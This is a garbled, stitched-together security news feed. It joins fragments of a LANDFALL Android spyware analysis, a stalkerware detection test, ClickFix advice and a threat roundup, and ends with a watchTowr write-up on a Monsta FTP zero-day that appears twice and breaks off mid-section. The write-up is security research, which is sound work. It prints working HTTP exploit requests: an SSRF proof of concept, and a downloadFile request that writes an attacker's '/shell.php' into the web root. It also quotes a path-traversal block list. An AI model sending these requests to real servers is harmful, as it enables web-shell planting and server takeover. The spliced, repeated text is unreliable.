One  and resolves  and  into global function pointers.The other tears this down and clears the pointers.Both exist to support  work but are not referenced by the observed code path.A more substantial routine accepts a list of file system paths. For each, it saves the current label via , invokes an internal labeler on the path, applies ownership via  and then restores the saved label with . It returns distinct negative codes when  or  fail.There is a file probe that attempts to open a path and maps the outcome to internal status codes (success, permission denied, not found, generic error). It also resets internal library state (including any previously opened SELinux handles).Map process‑execution outcome to message status: A tiny mapper converts the result of an internal command‑execution helper into message catalog codes (e.g., mapping a specific return (1) to  code  and 2–3 to ). It standardizes reporting for helpers but is not reached by the current logic.Building a device‑report JSON array: Another dormant routine constructs a cJSON array where each entry carries , a Base64‑encoded binary field, a  boolean and a textual  derived from the internal  table. It walks an input vector, reads the referenced file into memory, Base64 encodes it and appends to the array.A small string‑templating helper finds occurrences of the token  inside a JSON value and replaces them with the runtime path tracked by the .Appending  to telemetry: A diagnostic helper parses , extracts the  line, converts it to an integer, and, if greater than zero, appends a formatted key/value into the request body via the ’s string‑builder.A staging helper concatenates an existing buffer with a pseudo‑random block derived from an input string:
It seeds a byte with It XORs each subsequent byte of the input into a rolling accumulatorIt writes the accumulator bytes as a suffixIt then writes the combined buffer to a given file path via the ’s writerA two‑step installer/uninstaller pair uses three config keys: ,  and . The main routine checks that all three are set, copies the backup back to the origin if needed and then deletes the payload file. It returns distinct status codes (//) that map to the message catalog entries for “no config,” “failed move” and “failed unlink.” A sibling routine conditionally creates or truncates the backup file ( with mode “”) when a global persistence flag is set.Battery percentage via : A utility reads battery capacity from the system’s power‑supply , checking two common locations:  and .Two routines set up and finalize the working directory under app‑private storage.
The first creates the directory tree, applies mode  (), temporarily adds execute to the parent and copies the resolved path into . And, when running as , it attempts to mount a  at that location to keep artifacts in memoryThe second (cleanup/finalize) can, when root and the directory exists, run  and ship the result home. It then restores the parent directory’s original mode and frees the path bufferProcess discovery by SELinux context and by : Two search helpers iterate , building and reading per‑PID files.
One compares  against a target SELinux context and then confirms the process has PPID 1The other compares  against a target On a match, they write the PID to an out‑parameter and return successDebug‑printing a variant array: A developer‑facing routine prints a small typed array structure. It formats type names from a table, dumps short byte arrays inside square brackets and emits a single character for a specific type, one element per line. This looks like leftover debugging and is not invoked by active code.None of these helpers are exercised by this component’s main execution loop. Their presence is consistent with a staged architecture in which subsequently loaded shared objects, forming the complete LANDFALL framework, expand collection and persistence using capabilities already compiled into this loader.]]></content:encoded></item><item><title>Is your cyberinsurance paid up?

Despite measures from both the tech industry and platform providers, stalkerware-type apps, which are apps that can be installed covertly to spy on a victim’s private life, remain a critical concern.This comprehensive assessment, developed in collaboration with Electronic Frontier Foundation (EFF), evaluated 13 leading Android security solutions against 17 diverse stalkerware-type apps. Key findings show that stalkerware persists even as providers and coalitions crack down: it’s sideloaded from developer websites, designed to evade detection, and frequently stores sensitive victim data on insecure servers, often exposing it to wider risks like public data leaks.For this test, each security app was assessed for its ability to clearly detect and report stalkerware, not just using generic labels, but with explicit warnings tailored to support possible victims.AV-Comparatives is an independent organization offering systematic testing that checks whether security software, such as PC/Mac-based antivirus products and mobile security solutions, lives up to its promises. Of the 13 security products tested in September 2025, only a few stood out for detection accuracy, clarity, and responsible alerting, with Malwarebytes the only one to score a 100% detection rate. The results show clear differences in performance between mobile security products.  stood out by detecting all stalkerware testcases, achieving a 100% detection rate. Bitdefender, ESET, Kaspersky, and McAfee followed closely with 94% each, showing consistently high effectiveness. Avast, Avira, and F-Secure also performed well, identifying 88% of the test set, while Norton and Sophos achieved moderate coverage, detecting around 82%. At the lower end, G Data (65%), Google (53%), and Trend Micro (59%) missed a substantial portion of the stalkerware.As one of the founding members of the Coalition Against Stalkerware, Malwarebytes sees this result as much more than a technical win. For us, the mission goes beyond simply blocking malicious software. Stalkerware-type apps are often used by abusers to systematically invade privacy and exert control. Their impact is highly personal, making reliable detection and safe reporting imperative.Our participation in the coalition reflects a commitment to industry best practices: preventing stalkerware-type apps from being quietly installed, giving users detailed and honest threat information, and ensuring that every detection alert is crafted with survivor safety in mind. Scoring 100% in this test validates years of advocacy and development focused on the real-world needs of victims and their supporters, which goes beyond focusing on theoretical malware samples.Ultimately, consistent leadership in stalkerware detection means standing alongside partners and survivor organizations to raise public awareness, drive safer technology, and provide every user with a clear path to reclaim their privacy. For Malwarebytes, achieving a perfect score isn’t just a mark of product quality; it’s proof of our commitment to your privacy and security.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Samsung Mobile Flaw Exploited as Zero-Day to Deploy LANDFALL Android Spyware</title><link>https://thehackernews.com/2025/11/samsung-zero-click-flaw-exploited-to.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxnkLkwZDN9VORq3DEpVtJQh6phis8RMKVCTHdeszGmpt2Ec7PomBirtsbg7ySqLM49GAicSD8lxHN2AhVp4VgNOcpFl2FOLflhe6NqZHfug6F79FBkmakco2bPNOZCffW-oOAzKYevoWB3iNPnn6qbX8e9I98iaNOT3gS3ZD4fKVebHaxXCLjQy4pjCeE/s1600/mobile-exploit.jpg" length="" type=""/><pubDate>Fri, 7 Nov 2025 18:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A now-patched security flaw in Samsung Galaxy Android devices was exploited as a zero-day to deliver a "commercial-grade" Android spyware dubbed LANDFALL in targeted attacks in the Middle East.

A countdown timer adds urgency, pressuring users to complete the “challenge” within a minute. When people rush instead of thinking things through, social engineering wins.Unsurprisingly, most of these pages spread through SEO-poisoned Google search results, although they also circulate via email, social media, and in-app ads too.With ClickFix running rampant—and it doesn’t look like it’s going away anytime soon—it’s important to be aware, careful, and protected.Don’t rush to follow instructions on a webpage or prompt, especially if it asks you to run commands on your device or copy-paste code. Attackers rely on urgency to bypass your critical thinking, so be cautious of pages urging immediate action. Sophisticated ClickFix pages add countdowns, user counters, or other pressure tactics to make you act quickly.Avoid running commands or scripts from untrusted sources. Never run code or commands copied from websites, emails, or messages unless you trust the source and understand the action’s purpose. Verify instructions independently. If a website tells you to execute a command or perform a technical action, check through official documentation or contact support before proceeding.Limit the use of copy-paste for commands. Manually typing commands instead of copy-pasting can reduce the risk of unknowingly running malicious payloads hidden in copied text.Educate yourself on evolving attack techniques. Understanding that attacks may come from unexpected vectors and evolve helps maintain vigilance.

The defendants allegedly acted as BlackCat affiliates, breaching networks, stealing data, deploying encryption malware, and demanding cryptocurrency ransoms. Victims included medical, pharmaceutical, and engineering firms. Prosecutors say the ransom demands ranged from $300,000 to $10 million, with one company paying out $1.27 million. The trio faces up to 50 years each in prison if convicted.Also this week,  stolen via fraudulent IT worker schemes. The designated include Ryujong Credit Bank and Korea Mangyongdae Computer Technology Company (KMCTC), along with executives and bankers responsible for managing funds linked to ransomware attacks and UN sanctions violations. OFAC says that over the last 3 years DPRK-affiliated cybercriminals have stolen more than $3 billion in cryptocurrency using malware and social engineering. The sanctions freeze U.S. assets and warn that transactions with these entities risk secondary penalties.In Europe, . The criminals allegedly created fake crypto investment platforms that promised high returns and recruited victims through social media, cold calls, and fake endorsements from celebrity investors. Victims lost their funds while the suspects laundered the stolen assets using blockchain tools. In operations coordinated by Eurojust in Cyprus, Spain, and Germany, law enforcement seized cash, crypto, and bank accounts.The Bad | SleepyDuck Trojan Exploits Ethereum Smart Contracts to Evade Takedown, researchers say. The malware uses Ethereum smart contracts to manage its command and control (C2) communications, helping it to maintain persistence even if its main server is taken down.Initially benign when published on October 31, the infected extension, juan-bianco.solidity-vlang, became malicious after an update made the following day, by which time it had already been downloaded 14,000 times. For now, the extension remains available on Open VSX with a public warning. In total, it has been downloaded over 53,000 times.Security researchers report that SleepyDuck activates when the code editor starts, a Solidity file opens, or when a compile command runs. It disguises its malicious activity through a fake  function from , while secretly executing payloads that collect system information such as hostnames, usernames, MAC addresses, and timezones.After it is triggered, the trojan queries the Ethereum blockchain to find the fastest RPC provider, read its C2 details, and enter a polling loop for new instructions. This blockchain-based C2 redundancy means that .In response, Open VSX has introduced new security measures, including shorter token lifetimes, automated scans, revoking any leaked credentials, and working in coordination with VS Code to block emerging threats. Best practices for developers include verifying extension publishers and installing software only from trusted repositories to avoid supply-chain compromises.The Ugly | Iran-Based Actors Target U.S. Policy Experts in New Espionage CampaignBetween June and August, a newly identified threat cluster dubbed ‘UNK_SmudgedSerpent’  focused on the Middle East. The campaign, coinciding with rising Iran-Israel tensions, uses politically-themed lures related to Iranian domestic affairs and the militarization of the Islamic Revolutionary Guard Corps (IRGC).Researchers say the threat actors behind the campaign initiated attacks with benign email exchanges before introducing phishing links impersonating prominent U.S. foreign policy figures and think tank institutions like the Brookings Institution and Washington Institute. The targeted victims, over 20 U.S.-based experts on Iran-related policy, were enticed to open malicious meeting documents and login pages designed to harvest their Microsoft account credentials. In some attacks, the attackers sent URLs leading to fake MS Teams login pages but pivoted to spoofed OnlyOffice sites if the victim grew suspicious.Clicking the links led to the download of malicious MSI installers disguised as Microsoft Teams, which then deployed legitimate remote monitoring and management (RMM) software like PDQ Connect. Subsequent activity suggests attackers manually installed additional tools such as ISL Online, indicating possible hands-on-keyboard intrusion.Researchers note that the operation’s tactics mirror those of known Iranian cyberespionage groups such as TA455 (UNC1549, Smoke Sandstorm), TA453 (TunnelVision, APT 35, UNC788), and TA450 (TEMP.Zagros).

We get it. Go sit in the middle of the highway. That can also be safe, “it just depends”.Our journey began, initially, with a specific version of Monsta FTP in the “crosshairs” so to speak. Specifically, Monsta FTP  .Those of you who live/breathe version numbers of enterprise-used software, this version number likely has you frothing at the mouth. For those that aren’t, we will just tell you what the rabid already know - this is not the latest version of Monsta FTP, which at the time of our research was  published in July 2025.Wipe the froth away, and let us explain - why are we looking at an older version?Well, our research shows that a significant portion of the Internet is still not running the latest version (surprise!) and the powers-that-be had some random theory.Random theories aside, Monsta FTP has a fascinating history of vulnerabilities. Following a gut feeling of general unease, we started our endeavours by determining if previous vulnerabilities had been patched correctly.Looking through our favourite, shiniest CVE database - three (that’s 3) vulnerabilities stood out, supposedly affecting .That’s just 1 minor version before our target ! (Look at us, maths!)CVE-2022-31827 : Monsta FTP v2.10.3 was discovered to contain a Server-Side Request Forgery (SSRF) via the function performFetchRequest at HTTPFetcher.php.CVE-2022-27469 : Monsta FTP v2.10.3 was discovered to allow attackers to execute Server-Side Request Forgery (SSRF).CVE-2022-27468 : Monsta FTP v2.10.3 was discovered to contain an arbitrary file upload which allows attackers to execute arbitrary code via a crafted file uploaded to the web server.Cue the usual actions, we quickly deployed two (2) environments;One running vulnerable version  andOne running our target instance .Despite the 3 vulnerabilities reported in version , there is little to no change in the code in .In fact, the only code we were able to identify any change within was purely cosmetic.Scratching our heads and questioning reality around us, we wondered - could this mean that the vulnerabilities previously highlighted in  actually exist in later versions?After an exasperated sigh at the general state of the world, and beginning to get the feeling that this was about to become appropriately described as a ‘saga’, we continued.Within the aforementioned CVEs are a number of references - for example, CVE-2022-31827, the Server-Side Request Forgery vulnerability, references a PoC which when we blindly fired at both  and , worked.. “as expected” and was trivially reproduced:POST /application/api/api.php HTTP/1.1
Host: {{Hostname}}
Content-Length: 275
Content-Type: application/x-www-form-urlencoded

request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-Server}}","remoteUsername":"zero","initialDirectory":"/tmp/","authenticationModeName":"Password","password":"123456","port":22},"actionName":"fetchRemoteFile","context":{"source":"http://{{External-Server}}/flag.txt"}}
In the references for CVE-2022-27468 was a link to a YouTube playlist (because, of course?) - but by the time we made it there, the videos had been marked as hidden:Following a suspicion that the SSRF reporter was the same as the user who reported the RCE vulnerability (and thus likely connected to the mysterious YouTube playlist), we went rummaging through their GitHub account - just in case a fleeting moment involving a compass and morals had hit them and prevented them from publishing a PoC.But alas, this was not the case.Given the above and the lack of code changes, we concluded the following: has a reported SSRF and RCE vulnerability has the same SSRF and RCE vulnerabilities, unfixedEverything is still awesomeIf Unsure, Apply Bubble WrapArmed with concern, we wanted to verify whether these vulnerabilities remained even in the latest version (at the time of research) - version .The codebase has undergone substantial changes over this period, and the developers have been clearly busy over the past three years. Alongside major new functionality, we noticed an intriguing addition: a file named .This file immediately stood out.It introduces a series of filtering functions applied across the application, including (but not limited to) explicit checks for path traversal and other input validation mechanisms:    /**
     * Check for directory traversal patterns
     */
    private static function containsDirectoryTraversal($path) {
        $patterns = [
            '../', '..\\\\', '..%2f', '..%2F', '..%5c', '..%5C',
            '%2e%2e%2f', '%2E%2E%2F', '%2e%2e%5c', '%2E%2E%5C',
            '....//....' // Double encoding attempts
        ];
        
        $lowerPath = strtolower($path);
        foreach ($patterns as $pattern) {
            if (strpos($lowerPath, $pattern) !== false) {
                return true;
            }
        }
        
        return false;
    }
There were also newly introduced functions to validate file paths:    /**
     * Validate and sanitize file paths to prevent directory traversal
     */
    public static function validateFilePath($path, $allowAbsolute = false) {
        if (!is_string($path)) {
            throw new InvalidArgumentException("Path must be a string");
        }
        
        if (strlen($path) > self::MAX_PATH_LENGTH) {
            throw new InvalidArgumentException("Path too long (max " . self::MAX_PATH_LENGTH . " characters)");
        }
        
        // Check for null bytes
        if (strpos($path, "\\0") !== false) {
            throw new InvalidArgumentException("Path contains null bytes");
        }
        
        // Check for directory traversal patterns
        if (self::containsDirectoryTraversal($path)) {
            throw new InvalidArgumentException("Path contains directory traversal sequences");
        }
        
        // Validate absolute paths if not allowed
        if (!$allowAbsolute && (substr($path, 0, 1) === '/' || preg_match('/^[a-zA-Z]:\\\\\\\\/', $path))) {
            throw new InvalidArgumentException("Absolute paths not allowed");
        }
        
        // Normalize the path
        return PathOperations::normalize($path);
    }
We won't list everything added, but rest assured - if it can be validated, a function has been added for it.These new filtering and validation helpers were subsequently applied throughout the codebase, wherever user input might be handled (and perhaps even in places it's definitely not). All the telltale signs of precise remediation.At first glance, we assumed these additions might represent (or at least relate to) fixes for the vulnerabilities we’ve been discussing - including the RCE identified as CVE-2022-27468.Before we went any deeper into the code, we decided to do a quick sanity check: by replaying our known-correct reproducer for the SSRF vulnerability (CVE-2025-31827) against the latest release ().Surprisingly? Shockingly? Disappointingly? Inevitably? It still worked.Which raises a question we couldn’t resist asking: did the developers actually know where to patch the vulnerabilities? (This is also the polite version of the question we originally asked).Or, did they just guess? Perhaps they never received the YouTube video playlist? Perhaps it was actually just Taylor Swift songs, subsequently hidden to confuse us all. And so, perhaps, following our shiny theory, they decided to wrap the entirety of the Monsta FTP in performative bubble wrap and called it a day.Honestly, at this stage and with what we’ve seen in general, we wouldn’t be shocked.Either way, the result is the same: the Monsta FTP code base now contains sprawling usage of validation functions that probably make you feel safe and secure - but don’t appear to actually have any material impact on the vulnerabilities they appear to be trying to resolve.Eventually, We Figured It OutAfter picking apart what felt like a web of overall confusion, we were able to make some progress in understanding the vulnerability itself.request={ <----[0]

It all starts with/mftp/application/api/api.php :At , we can see that the endpoint accepts a body parameter called  . Specifcially, the application expects a structured JSON blob as a value to  which Monsta FTP parses and uses to dispatch the right function.At , we specify a  - telling Monsta FTP whether we’re connecting to an FTP or SFTP server.At , we have a nested JSON blob called  - which contains the details of the external (S)FTP server we want to connect to, including  (specified at  and authenticationModeName (specified at  ) to allow a user to specify the type of authentication to use.At , the  parameter specifies the function we want to use within Monsta FTP once a successful connection is established.This code, with all available functions, is detailed in the switch statement below:function validateContextForAction($actionName, $context) {
        switch ($actionName) {
            case 'uploadFile':
            case 'uploadFileToNewDirectory':
            case 'uploadArchive':
                if (isset($context['remotePath'])) {
                    $validatedPath = InputValidator::validateFilePath($context['remotePath'], true);
                    // Additional upload-specific validation
                    if (isset($context['localPath'])) {
                        InputValidator::validateFileUpload($context['localPath'], $validatedPath);
                    }
                }
                break;

            case 'getFileContents':
            case 'deleteFile':
                if (isset($context['remotePath'])) {
                    InputValidator::validateFilePath($context['remotePath'], true);
                }
                break;
                
            .. snip ..
        }
Eagle-eyed readers will be quick to notice that absolutely everything is wrapped in the usage of  .Undeterred, very quickly, one specific switch case value stood out to us: .Validation only really matters if we’re trying to do something nefarious - but is generally going to be wholly useless if we’re using the code as intended.Unsurprisingly, the  switch case maps to a function with the same name: */
public function downloadFile($transferOperation) {
    $this->ensureConnectedAndAuthenticated('DOWNLOAD_OPERATION');

    if (!$this->handleDownloadFile($transferOperation))
        $this->handleMultiTransferError('DOWNLOAD_OPERATION', $transferOperation);
}
When using Monsta FTP to connect to an SFTP server, maps to application/api/file_sources/connection/SFTPConnection.php .This, our friends, is where things start to look up:protected function handleDownloadFile($transferOperation) {
    $remoteURL = $this->getRemoteFileURL($transferOperation->getRemotePath());  <---- [0]

     if(copy($remoteURL, $transferOperation->getLocalPath())) <---- [1]
         return true;

    // Check if remote file exists to provide better error information
    $statResult = stat($remoteURL);
    return false; // Copy failed
}
At  we can see that  is called.As we can see below, this function effectively joins two strings together - the external SFTP host, and a file path provided in the user-controlled parameter .
private function getRemoteFileURL($remotePath) {
    if ($remotePath == '/')
        $remotePath = '/./';
    return "ssh2.sftp://" . $this->sftpConnection . $remotePath;
}
At  within , we can see that the code is fairly simple: the  function is executed to transfer a file from the remote SFTP server to the location specified by the function .Surprisingly enough, the value returned by the function  is user-controlled - it’s the value of the  parameter.The code below, included for verbosity, shows how the  function proceeds to move files as instructed.public function copy($source, $destination) {
            $this->ensureConnectedAndAuthenticated('COPY_OPERATION');

						
						.. snip ..

            for ($i = 0; $i < sizeof($sources); ++$i) {
                $destinationPath = $destinations[$i];
                $destinationDir = PathOperations::remoteDirname($destinationPath);

                $sourcePathAndItem = $sources[$i];

                $sourcePath = $sourcePathAndItem[0];
                $sourceItem = $sourcePathAndItem[1];

                if ($destinationDir != "" && $destinationDir != "/" &&
                    array_search($destinationDir, $destinationDirs) === false) {
                    $destinationDirs[] = $destinationDir;
                    $this->makeDirectoryWithIntermediates($destinationDir);
                }

                if ($sourceItem === null)
                    $this->handleCopy($sourcePath, $destinationPath);
                else {
                    if ($sourceItem->isDirectory()) {
                        if (array_search($destinationPath, $destinationDirs) === false) {
                            $destinationDirs[] = $destinationPath;
                            $this->makeDirectoryWithIntermediates($destinationPath);
                        }
                    } else {
                        $this->handleCopy($sourcePath, $destinationPath);
                    }

                    $newPermissions[$destinationPath] = $sourceItem->getNumericPermissions();
                }
            }

            .. snip ..
 }
If you’re following along at home, you’d be forgiven for thinking this is a cute little theory that looks great on paper but falls apart in practice.Here’s the idea (shocking, we know):Trick Monsta FTP into connecting to our remote SFTP host.Have Monsta FTP download a file we control.Tell Monsta FTP to write that file to an arbitrary path on the Monsta server.Spoiler: it actually worked.We spun up a malicious SFTP server, sent a  request to the Monsta FTP instance, and watched it behave exactly like we feared - it connected, pulled our payload, and wrote it to the specified path.The following HTTP request illustrates how this would work:POST /mftp/application/api/api.php HTTP/1.1
Host: {{Nostname}}
Content-Type: application/x-www-form-urlencoded

request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-IP}}","remoteUsername":"sftpuser","initialDirectory":"/","authenticationModeName":"Password","password":"password111","port":2222},"actionName":"downloadFile","context":{"remotePath":"/shell.php","localPath":"/var/www/html/mftp/index3.php"}}&csrf_token=6e080f63ea774944feedef49eb77c6fffdd8291b9c6561022696b9222942644e

Happy Friday, friends and.. others.

We’re glad/sorry to hear that your week has been good/bad, and it’s the weekend/but at least it’s almost the weekend!

### What’re We Doing Today, Mr Fox?

Today, in a tale that seems all too familar at this point, we begun as innocently as always - to reproduce an N-day in Monsta FTP as part of our emerging threat rapid reaction process we enact across the watchTowr client base.

Yet, somehow, we find ourselves saddled with the reality of discussing another zero-day.

“What on earth is Monsta FTP?” you might say.

Monsta FTP is a web-based FTP client that lets users manage and transfer files directly through a browser on remote servers, with a minimum of 5,000 instances sitting on the Internet.

We say minimum because the default context path of `/mftp/` has the likely unintended side effect of masking the exposure of this technology from generic Internet-wide scanners.

With an external (S)FTP server in hand, it's possible to connect to that server and browse its contents through Monsta FTP with the full suite of Web 3/4/5/6/7/8/9.0 functionality available - uploading, downloading AND modifying of files in an easy and user-friendly interface:

With a proud user base ranging from financial institutions, enterprises and over-engineering individual users, Monsta FTP is an interesting target for threat actors - made only better by the fact that it’s written in PHP.

For the love of all things good, we know - using PHP does not inherently make things insecure. We get it.

Go sit in the middle of the highway. That can also be safe, “it just depends”.

Just like PHP.

### What The N-Day

Our journey began, initially, with a specific version of Monsta FTP in the “crosshairs” so to speak. Specifically, Monsta FTP `2.10.4` .

Those of you who live/breathe version numbers of enterprise-used software, this version number likely has you frothing at the mouth. For those that aren’t, we will just tell you what the rabid already know - this is not the latest version of Monsta FTP, which at the time of our research was `2.11` published in July 2025.

Wipe the froth away, and let us explain - why are we looking at an older version?

Well, our research shows that a significant portion of the Internet is still not running the latest version (surprise!) and the powers-that-be had some random theory.

Random theories aside, Monsta FTP has a fascinating history of vulnerabilities. Following a gut feeling of general unease, we started our endeavours by determining if previous vulnerabilities had been patched correctly.

Looking through our favourite, shiniest CVE database - three (that’s 3) vulnerabilities stood out, supposedly affecting `2.10.3`.

That’s just 1 minor version before our target `2.10.4`! (Look at us, maths!)

- CVE-2022-31827 : Monsta FTP v2.10.3 was discovered to contain a Server-Side Request Forgery (SSRF) via the function performFetchRequest at HTTPFetcher.php.
- CVE-2022-27469 : Monsta FTP v2.10.3 was discovered to allow attackers to execute Server-Side Request Forgery (SSRF).
- CVE-2022-27468 : Monsta FTP v2.10.3 was discovered to contain an arbitrary file upload which allows attackers to execute arbitrary code via a crafted file uploaded to the web server.

Cue the usual actions, we quickly deployed two (2) environments;

- One running vulnerable version `2.10.3` and
- One running our target instance `2.10.4`.

Despite the 3 vulnerabilities reported in version `2.10.3`, there is little to no change in the code in `2.10.4`.

In fact, the only code we were able to identify any change within was purely cosmetic.

Scratching our heads and questioning reality around us, we wondered - could this mean that the vulnerabilities previously highlighted in `2.10.3` actually exist in later versions?

After an exasperated sigh at the general state of the world, and beginning to get the feeling that this was about to become appropriately described as a ‘saga’, we continued.

Within the aforementioned CVEs are a number of references - for example, CVE-2022-31827, the Server-Side Request Forgery vulnerability, references a PoC which when we blindly fired at both `2.10.3` and `2.10.4`, worked.. “as expected” and was trivially reproduced:

```
POST /application/api/api.php HTTP/1.1 Host: {{Hostname}} Content-Length: 275 Content-Type: application/x-www-form-urlencoded request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-Server}}","remoteUsername":"zero","initialDirectory":"/tmp/","authenticationModeName":"Password","password":"123456","port":22},"actionName":"fetchRemoteFile","context":{"source":"http://{{External-Server}}/flag.txt"}}
```

In the references for CVE-2022-27468 was a link to a YouTube playlist (because, of course?) - but by the time we made it there, the videos had been marked as hidden:

Following a suspicion that the SSRF reporter was the same as the user who reported the RCE vulnerability (and thus likely connected to the mysterious YouTube playlist), we went rummaging through their GitHub account - just in case a fleeting moment involving a compass and morals had hit them and prevented them from publishing a PoC.

But alas, this was not the case.

Given the above and the lack of code changes, we concluded the following:

- Everything is awesome
- `2.10.3` has a reported SSRF and RCE vulnerability
- `2.10.4` has the same SSRF and RCE vulnerabilities, unfixed
- Everything is still awesome

### If Unsure, Apply Bubble Wrap

Armed with concern, we wanted to verify whether these vulnerabilities remained even in the latest version (at the time of research) - version `2.11`.

The codebase has undergone substantial changes over this period, and the developers have been clearly busy over the past three years. Alongside major new functionality, we noticed an intriguing addition: a file named `inputValidator.php`.

This file immediately stood out.

It introduces a series of filtering functions applied across the application, including (but not limited to) explicit checks for path traversal and other input validation mechanisms:

```
/** * Check for directory traversal patterns */ private static function containsDirectoryTraversal($path) { $patterns = [ '../', '..\\\\', '..%2f', '..%2F', '..%5c', '..%5C', '%2e%2e%2f', '%2E%2E%2F', '%2e%2e%5c', '%2E%2E%5C', '....//....' // Double encoding attempts ]; $lowerPath = strtolower($path); foreach ($patterns as $pattern) { if (strpos($lowerPath, $pattern) !== false) { return true; } } return false; }
```

There were also newly introduced functions to validate file paths:

```
/** * Validate and sanitize file paths to prevent directory traversal */ public static function validateFilePath($path, $allowAbsolute = false) { if (!is_string($path)) { throw new InvalidArgumentException("Path must be a string"); } if (strlen($path) > self::MAX_PATH_LENGTH) { throw new InvalidArgumentException("Path too long (max " . self::MAX_PATH_LENGTH . " characters)"); } // Check for null bytes if (strpos($path, "\\0") !== false) { throw new InvalidArgumentException("Path contains null bytes"); } // Check for directory traversal patterns if (self::containsDirectoryTraversal($path)) { throw new InvalidArgumentException("Path contains directory traversal sequences"); } // Validate absolute paths if not allowed if (!$allowAbsolute && (substr($path, 0, 1) === '/' || preg_match('/^[a-zA-Z]:\\\\\\\\/', $path))) { throw new InvalidArgumentException("Absolute paths not allowed"); } // Normalize the path return PathOperations::normalize($path); }
```

We won't list everything added, but rest assured - if it can be validated, a function has been added for it.

These new filtering and validation helpers were subsequently applied throughout the codebase, wherever user input might be handled (and perhaps even in places it's definitely not). All the telltale signs of precise remediation.

At first glance, we assumed these additions might represent (or at least relate to) fixes for the vulnerabilities we’ve been discussing - including the RCE identified as CVE-2022-27468.

Before we went any deeper into the code, we decided to do a quick sanity check: by replaying our known-correct reproducer for the SSRF vulnerability (CVE-2025-31827) against the latest release ( `2.11`).

Surprisingly? Shockingly? Disappointingly? Inevitably? It still worked.

Which raises a question we couldn’t resist asking: did the developers actually know where to patch the vulnerabilities? (This is also the polite version of the question we originally asked).

Or, did they just guess? Perhaps they never received the YouTube video playlist? Perhaps it was actually just Taylor Swift songs, subsequently hidden to confuse us all. And so, perhaps, following our shiny theory, they decided to wrap the entirety of the Monsta FTP in performative bubble wrap and called it a day.

Honestly, at this stage and with what we’ve seen in general, we wouldn’t be shocked.

Either way, the result is the same: the Monsta FTP code base now contains sprawling usage of validation functions that probably make you feel safe and secure - but don’t appear to actually have any material impact on the vulnerabilities they appear to be trying to resolve.

### Eventually, We Figured It Out

After picking apart what felt like a web of overall confusion, we were able to make some progress in understanding the vulnerability itself.

```
request={ <----[0] "connectionType": "sftp", <----[1] "configuration": { <----[2] "host": "{{External-SFTP-Server}}", "remoteUsername": "zero", "initialDirectory": "/tmp/", <----[3] "authenticationModeName": "Password", <----[4] "password": "123456", "port": 22 }, "actionName": "fetchRemoteFile", <----[5] "context": { "source": "http://{{External-Server}}/flag.txt" } }
```

It all starts with `/mftp/application/api/api.php` :

- At `[0]`, we can see that the endpoint accepts a body parameter called `request`. Specifcially, the application expects a structured JSON blob as a value to `request` which Monsta FTP parses and uses to dispatch the right function.
- At `[1]`, we specify a `connectionType`\- telling Monsta FTP whether we’re connecting to an FTP or SFTP server.
- At `[2]`, we have a nested JSON blob called `configuration`\- which contains the details of the external (S)FTP server we want to connect to, including `initialDirectory`(specified at `[3]` and authenticationModeName (specified at `[4]`) to allow a user to specify the type of authentication to use.
- At `[5]`, the `action` parameter specifies the function we want to use within Monsta FTP once a successful connection is established.

This code, with all available functions, is detailed in the switch statement below:

```
function validateContextForAction($actionName, $context) { switch ($actionName) { case 'uploadFile': case 'uploadFileToNewDirectory': case 'uploadArchive': if (isset($context['remotePath'])) { $validatedPath = InputValidator::validateFilePath($context['remotePath'], true); // Additional upload-specific validation if (isset($context['localPath'])) { InputValidator::validateFileUpload($context['localPath'], $validatedPath); } } break; case 'downloadFile': case 'fetchFile': case 'getFileContents': case 'deleteFile': if (isset($context['remotePath'])) { InputValidator::validateFilePath($context['remotePath'], true); } break; .. snip .. }
```

Eagle-eyed readers will be quick to notice that absolutely everything is wrapped in the usage of `InputValidators` .

Undeterred, very quickly, one specific switch case value stood out to us: `downloadFile`.

Validation only really matters if we’re trying to do something nefarious - but is generally going to be wholly useless if we’re using the code as intended.

Unsurprisingly, the `downloadFile` switch case maps to a function with the same name:

```
*/ public function downloadFile($transferOperation) { $this->ensureConnectedAndAuthenticated('DOWNLOAD_OPERATION'); if (!$this->handleDownloadFile($transferOperation)) $this->handleMultiTransferError('DOWNLOAD_OPERATION', $transferOperation); }
```

When using Monsta FTP to connect to an SFTP server, `handleDownloadFile` maps to `application/api/file_sources/connection/SFTPConnection.php` .

This, our friends, is where things start to look up:

```
protected function handleDownloadFile($transferOperation) { $remoteURL = $this->getRemoteFileURL($transferOperation->getRemotePath()); <---- [0] if(copy($remoteURL, $transferOperation->getLocalPath())) <---- [1] return true; // Check if remote file exists to provide better error information $statResult = stat($remoteURL); return false; // Copy failed }
```

At `[0]` we can see that `getRemoteFileURL` is called.

As we can see below, this function effectively joins two strings together - the external SFTP host, and a file path provided in the user-controlled parameter `remotePath`.

```
private function getRemoteFileURL($remotePath) { if ($remotePath == '/') $remotePath = '/./'; return "ssh2.sftp://" . $this->sftpConnection . $remotePath; }
```

At `[1]` within `handleDownloadFile`, we can see that the code is fairly simple: the `copy` function is executed to transfer a file from the remote SFTP server to the location specified by the function `getLocalPath`.

Surprisingly enough, the value returned by the function `getLocalPath` is user-controlled - it’s the value of the `localPath` parameter.

The code below, included for verbosity, shows how the `copy` function proceeds to move files as instructed.

```
public function copy($source, $destination) { $this->ensureConnectedAndAuthenticated('COPY_OPERATION'); .. snip .. for ($i = 0; $i < sizeof($sources); ++$i) { $destinationPath = $destinations[$i]; $destinationDir = PathOperations::remoteDirname($destinationPath); $sourcePathAndItem = $sources[$i]; $sourcePath = $sourcePathAndItem[0]; $sourceItem = $sourcePathAndItem[1]; if ($destinationDir != "" && $destinationDir != "/" && array_search($destinationDir, $destinationDirs) === false) { $destinationDirs[] = $destinationDir; $this->makeDirectoryWithIntermediates($destinationDir); } if ($sourceItem === null) $this->handleCopy($sourcePath, $destinationPath); else { if ($sourceItem->isDirectory()) { if (array_search($destinationPath, $destinationDirs) === false) { $destinationDirs[] = $destinationPath; $this->makeDirectoryWithIntermediates($destinationPath); } } else { $this->handleCopy($sourcePath, $destinationPath); } $newPermissions[$destinationPath] = $sourceItem->getNumericPermissions(); } } .. snip .. }
```

Brilliant, we guess.

### Simple Is As Simple Does

